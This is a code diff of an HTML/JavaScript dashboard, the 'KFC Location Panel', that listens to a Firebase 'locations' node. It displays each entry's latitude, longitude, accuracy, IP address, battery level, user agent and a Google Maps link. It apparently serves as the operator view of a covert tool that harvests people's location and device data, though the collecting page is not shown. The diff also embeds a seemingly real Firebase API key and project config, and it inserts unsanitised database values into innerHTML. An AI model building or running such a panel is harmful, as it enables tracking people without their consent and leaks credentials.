@@ -3,46 +3,63 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>KFC Panel - Live Data</title>
+  <title>KFC Panel - Location Monitor</title>
   <style>
     body {
-      background: #0d0d0d;
+      margin: 0;
+      padding: 20px;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0f0f0f;
       color: #fff;
-      font-family: 'Courier New', monospace;
-      padding: 30px;
     }
+
     h1 {
-      color: #ffcc00;
       text-align: center;
-      margin-bottom: 30px;
+      color: #ff0000;
+      text-shadow: 0 0 10px red;
     }
+
+    #output {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
     .card {
-      border: 2px solid #ff0000;
-      border-radius: 15px;
-      padding: 15px;
-      margin-bottom: 20px;
       background: #1a1a1a;
-      box-shadow: 0 0 10px #ff0000;
+      border-left: 4px solid #ff0000;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #ff000080;
+      animation: glow 2s infinite alternate;
     }
-    .map-link {
-      color: #00ccff;
+
+    .card a {
+      color: #00f7ff;
       text-decoration: none;
     }
-    .map-link:hover {
-      text-decoration: underline;
+
+    @keyframes glow {
+      from {
+        box-shadow: 0 0 5px #ff000080;
+      }
+      to {
+        box-shadow: 0 0 15px #ff0000;
+      }
     }
   </style>
 </head>
 <body>
-  <h1>🔥 KFC Live Panel 🔥</h1>
-  <div id="data-container"></div>
+  <h1>📍 KFC Location Panel</h1>
+  <div id="output">Loading...</div>
 
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <!-- Firebase Compat Scripts -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
   <script>
-    // Replace with your own config from Firebase
+    // 🔐 Replace this with YOUR actual config
   const firebaseConfig = {
   apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
   authDomain: "kfc-tracker.firebaseapp.com",
@@ -54,26 +71,33 @@
   measurementId: "G-EPEXKK3S37"
 };
 
+    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    const container = document.getElementById("data-container");
-
-    db.ref("kfc_locations").on("child_added", (snapshot) => {
+    // Listen to 'locations' node
+    db.ref("locations").on("value", (snapshot) => {
       const data = snapshot.val();
-      const card = document.createElement("div");
-      card.className = "card";
-      card.innerHTML = `
-        <strong>🕒 Time:</strong> ${data.timestamp}<br>
-        <strong>📍 Latitude:</strong> ${data.lat}<br>
-        <strong>📍 Longitude:</strong> ${data.lon}<br>
-        <strong>🎯 Accuracy:</strong> ${data.accuracy} meters<br>
-        <strong>🌐 IP Address:</strong> ${data.ip}<br>
-        <strong>🔋 Battery:</strong> ${data.battery}<br>
-        <strong>🧠 User Agent:</strong> ${data.userAgent}<br>
-        <strong>📌 Map:</strong> <a class="map-link" target="_blank" href="${data.mapUrl}">View on Google Maps</a>
-      `;
-      container.prepend(card); // Latest on top
+      const output = document.getElementById("output");
+      output.innerHTML = "";
+
+      if (data) {
+        Object.values(data).reverse().forEach(entry => {
+          output.innerHTML += `
+            <div class="card">
+              📍 <b>Latitude:</b> ${entry.lat}<br>
+              📍 <b>Longitude:</b> ${entry.lon}<br>
+              🎯 <b>Accuracy:</b> ${entry.accuracy || "N/A"}m<br>
+              🌐 <b>IP:</b> ${entry.ip}<br>
+              🔋 <b>Battery:</b> ${entry.battery}<br>
+              🧠 <b>User Agent:</b> ${entry.userAgent}<br>
+              🗺️ <a href="https://www.google.com/maps?q=${entry.lat},${entry.lon}" target="_blank">Open in Google Maps</a>
+            </div>
+          `;
+        });
+      } else {
+        output.innerHTML = "No data found.";
+      }
     });
   </script>
 </body>
